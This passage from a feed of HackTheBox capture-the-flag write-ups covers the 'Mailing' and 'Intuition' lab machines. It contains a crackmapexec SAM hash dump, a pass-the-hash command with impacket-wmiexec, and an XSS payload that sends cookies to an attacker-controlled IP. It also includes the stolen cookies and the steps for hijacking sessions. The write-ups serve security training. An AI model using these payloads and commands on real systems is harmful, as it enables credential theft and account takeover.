+&lt;p&gt;&lt;i class=&quot;fa-solid fa-triangle-exclamation fa-xl&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; &lt;b&gt;NOTICE:&lt;/b&gt; Its not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrators&lt;/code&gt; but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administradores&lt;/code&gt;. its in portuguese. If you do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrators (English)&lt;/code&gt; it will not work!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_Maya_Privs.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After uploading the &lt;mark&gt;`.odt file`&lt;/mark&gt; and waiting for a couple seconds we see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maya&lt;/code&gt; was added to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administradores&lt;/code&gt; group.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_Maya_Admin_access_proof.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Attempting to access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localadmin&lt;/code&gt;’s profile though we still are denied.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_No_Admin_Access.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;-crackmapexec&quot;&gt;&lt;i class=&quot;fa-solid fa-skull-crossbones&quot; style=&quot;color: #813d9c;&quot;&gt;&lt;/i&gt; CrackMapExec:&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Since we have administrator rights to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maya&lt;/code&gt; lets bust out one of our trusty windows tools &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt;.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; We are going to connect to the SMB we discovered in our Recon during initial engagement.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;crackmapexec smb mailing.htb -u maya -p &quot;m4y4ngs4ri&quot; --sam&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Using this command with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--sam&lt;/code&gt; flag allows us to request from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SAM Database&lt;/code&gt; and get hash passwords.&lt;/p&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-star&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--sam&lt;/code&gt; flag requests the SAM database from the target if the credentials are valid and the user has the necessary permissions. This database is a critical part of Windows security, containing hashed passwords and other sensitive information.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_Admin_SAM_Dump.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We successfully dump the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localadmin&lt;/code&gt; hash. Now we can perform a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass the hash&lt;/code&gt; attack and remote into the box with this hash.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pass-the-hash&quot;&gt;Pass the hash:&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-wmiexec localadmin@mailing.htb -hashes &quot;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Our connection is successful. We are now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localadmin&lt;/code&gt; on this box.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_LocalAdmin_Pwn.png&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 30 Aug 2024 07:00:00 -0400</pubDate>
+        <link>http://localhost:4000/Mailing</link>
+        <guid isPermaLink="true">http://localhost:4000/Mailing</guid>
+        
+        <category>HackTheBox</category>
+        
+        <category>CTF</category>
+        
+        <category>Easy</category>
+        
+        <category>Season 5 Anomalies</category>
+        
+        <category>Windows</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Intuition</title>
+        <description>&lt;h1 id=&quot;reconnaissance&quot;&gt;Reconnaissance:&lt;/h1&gt;
+
+&lt;h2 id=&quot;-rustscan&quot;&gt;&lt;i class=&quot;fa-brands fa-rust fa-sm&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; RustScan:&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|  &lt;span class=&quot;sb&quot;&gt;`| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`&lt;/span&gt;-&apos; &lt;span class=&quot;sb&quot;&gt;`-&apos;`&lt;/span&gt;-----&apos;&lt;span class=&quot;sb&quot;&gt;`----&apos;  `&lt;/span&gt;-&apos;  &lt;span class=&quot;sb&quot;&gt;`----&apos;  `&lt;/span&gt;---&apos; &lt;span class=&quot;sb&quot;&gt;`-&apos;  `&lt;/span&gt;-&apos;&lt;span class=&quot;sb&quot;&gt;`-&apos; `&lt;/span&gt;-&apos;
+The Modern Day Port Scanner.
+&lt;span class=&quot;gs&quot;&gt;________________________________________&lt;/span&gt;
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+&lt;span class=&quot;p&quot;&gt; --------------------------------------&lt;/span&gt;
+I scanned ports so fast, even my computer was surprised.
+
+Open 10.129.156.6:22
+Open 10.129.156.6:80
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;ports&quot;&gt;Ports:&lt;/h2&gt;
+&lt;ul class=&quot;checklist&quot;&gt;
+&lt;li&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; 22 - SSH&lt;/li&gt;
+&lt;li&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; 80 - Webpage&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;whatweb&quot;&gt;WhatWeb:&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; whatweb 10.129.156.6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_WhatWeb.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The domain appears to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;comprezzor.htb&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;fuzzing&quot;&gt;Fuzzing:&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://comprezzor.htb -H &quot;Host: FUZZ.comprezzor.htb&quot; -fs 178
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;fuzzing-results&quot;&gt;Fuzzing Results&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Subdomains:&lt;/strong&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; report.comprezzor.htb&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; auth.comprezzor.htb&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; dashboard.comprezzor.htb&lt;br /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Directories:&lt;/strong&gt; &lt;em&gt;Nothing of importance on main domain&lt;/em&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;strong&gt;/login&lt;/strong&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.comprezzor.htb&lt;/code&gt; subdomain&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;strong&gt;/backup&lt;/strong&gt; and &lt;strong&gt;/resolve&lt;/strong&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dashboard.comprezzor.htb&lt;/code&gt; subdomain&lt;br /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Fuzzing.png&quot; class=&quot;resize2&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-website-discovery&quot;&gt;&lt;i class=&quot;fa-solid fa-earth-americas&quot; style=&quot;color: #076678;&quot;&gt;&lt;/i&gt; Website Discovery&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;There’s a report bug feature. Its about the only thing you can do on the main page.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Clicking report bug button takes you to another page where you can create an account to report a bug.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/intuition_Report_Link.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/intuition_Report_Bug_Button.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Register a new account and login with that account. You can now successfully report a bug.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intutition_Report_Bug_Register_Account.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Registration.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Once registered lets go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;report a bug&lt;/code&gt;. The report bug submission form is located at &lt;mark&gt;`http://report.comprezzor.htb/report_bug`&lt;/mark&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Report_Submissions_Form.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Lets test this form for any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-xss-&quot;&gt;&lt;i class=&quot;fa-solid fa-server&quot; style=&quot;color: #b16286;&quot;&gt;&lt;/i&gt; XSS &lt;i class=&quot;fa-solid fa-arrow-right-from-bracket&quot; style=&quot;color: #b16286;&quot;&gt;&lt;/i&gt;&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Capture a request from the form and send it to your repeater.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Report_Submissions_Request.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can see a cookie set in the request&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-cookie-bite fa-lg&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; &lt;strong&gt;Cookie:&lt;/strong&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIkZyb2dnaWUiLCAicm9sZSI6ICJ1c2VyIn18OGY3YjI3OWQwZjk2MDEyMWFjMTc2M2Q0YzNiMjU2NTk4MGQzYzI3ODk5YmZlMzU3MjM4ZGMxYjY2ZTJhYzJiMg==&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Lets setup a server and use a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS&lt;/code&gt; payload to see if we can steal any cookies from the server.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-cookie-bite fa-lg&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; &lt;strong&gt;Cookie Theft:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Using a simple payload to see if we can request any cookies from the server.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;var i=new Image(); i.src=&quot;http://10.10.14.200:34000/?cookie=&quot;+btoa(document.cookie);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Cookie_Theft_Payload.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Setup a python server to listen for the reply to come from the server.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server 34000&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;After waiting for the server to process the request we actually get a hit on the cookies.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.129.156.6 - - [06/Sep/2024 06:51:50] &quot;GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA== HTTP/1.1&quot; 200
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Cookies.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The cookie is encypted with base64. Lets decrypt it so we can pass it through our browser cache and see if we can login using the cookie.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &apos;dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA==&apos; | base64 -d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-cookie-bite fa-lg&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Cookie_Theft_Decrypt.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;--cookie-login&quot;&gt;&lt;i class=&quot;fa-solid fa-cookie fa-xlg&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt;  Cookie Login:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Lets head over to the login page: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://auth.comprezzor.htb/login&lt;/code&gt;.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Open your browser console and navigate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;storage&lt;/code&gt; tab.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Browser_Storage_Cookie.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We want to replace the current cookie with the one we stole with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS&lt;/code&gt; attack.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Delete the current cookie then using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Key : Value &lt;/code&gt; pair lets insert our cookie.
+    &lt;ul&gt;
+      &lt;li&gt;Key: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_data&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Value: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;After inserting simply refresh the webpage with an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;F5&lt;/code&gt; or hitting the reload button.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-triangle-exclamation fa-xl&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; &lt;b&gt;NOTICE:&lt;/b&gt; You may have issues here. If you have issues with it triggering correctly please set your cookie to this.&lt;br /&gt;
+	* Name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_data&lt;/code&gt;
+	* Value: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4&lt;/code&gt;
+	* Domain: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.comprezzor.htb&lt;/code&gt;
+	* Path: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Then manually travel to &lt;mark&gt;`http://dashboard.comprezzor.htb`&lt;/mark&gt;. Setting it to this covers the whole domain. Im not sure why it doesn’t redirect sometimes but this should work also.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We land on a dashboard page as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webdev&lt;/code&gt;:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Dashboard_Webdev.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Once logged in you can see the bug reports being generated.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-report-generation&quot;&gt;&lt;i class=&quot;fa-regular fa-newspaper&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; Report Generation:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;We need to submit a report and see if it shows up here using &lt;mark&gt;`http://report.comprezzor.htb`&lt;/mark&gt;. Open a second tab and submit a report.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; If you send a report with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webdev&lt;/code&gt; cookie still in your browser you will get a ticket from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adam&lt;/code&gt;. This will not work, you will need to capture a request or use the same request you had for capturing the cookie that uses your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new user account&lt;/code&gt; to submit the ticket.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Report_Bug_Submission_Dashboard.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Using the same burp request we used earlier to capture the cookie send it again to see your ticket appear in the queue.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Froggie_Ticket.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We submit a report and notice we have low priority set as a default.&lt;/li&gt;
+  &lt;li&gt;Reading the instructions found on the website we can see that higher priority will be resolved by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. So if we can escalate the priority of our ticket maybe we can capture the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; cookie in the same manner as before.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-triangle-exclamation fa-xl&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; &lt;b&gt;NOTICE:&lt;/b&gt; I had to disable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dark reader&lt;/code&gt; it was messing up the UI and I couldn’t see my ticket. So if you have a dark mode enabled you may want to disable it.&lt;br /&gt;
+    &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Also, there is a script to remove tickets and set it back to a default state. So you need to be relatively quick in your exploiting or your ticket will disappear.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Froggie_Ticket_Priority.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-admin-cookies&quot;&gt;&lt;i class=&quot;fa-solid fa-cookie fa-xlg&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; Admin Cookies:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Make sure your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS payload&lt;/code&gt; is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Report Title&lt;/code&gt; of the ticket. So the admin reads it when it gets sent over.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Admin_Cookie_Theft_Priority_Report_Title.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;I actually had to change my payload. The one i was using wasn’t allowing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set high priority&lt;/code&gt; to show up in the ticket. Such odd behavior.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-explosion&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; Use this payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=x onerror=&quot;fetch(&quot;http://10.10.14.200&quot;34000/)&quot;&amp;gt;&lt;/code&gt;. Put this as your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReportTitle&lt;/code&gt; but leave the earlier cookie payload in the description.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-explosion&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; If you’re  not getting the admin cookie reset your box. Sometimes it gets broke from to many tickets being sent.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Your request should look like this.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /report_bug HTTP/1.1
+Host: report.comprezzor.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://report.comprezzor.htb/report_bug
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 207
+Origin: http://report.comprezzor.htb
+DNT: 1
+Connection: close
+Cookie: user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIkZyb2dnaWUiLCAicm9sZSI6ICJ1c2VyIn18OGY3YjI3OWQwZjk2MDEyMWFjMTc2M2Q0YzNiMjU2NTk4MGQzYzI3ODk5YmZlMzU3MjM4ZGMxYjY2ZTJhYzJiMg==
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+report_title=&amp;lt;img+src%3dx+onerror%3d&quot;fetch(&quot;http%3a//10.10.14.200&quot;34000/)&quot;&amp;gt;&amp;amp;description=&amp;lt;script&amp;gt;var+i%3dnew+Image()%3b+i.src%3d&quot;http%3a//10.10.14.200%3a34000/%3fcookie%3d&quot;%2bbtoa(document.cookie)%3b&amp;lt;/script&amp;gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Set the priority to high and you should get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin cookie&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
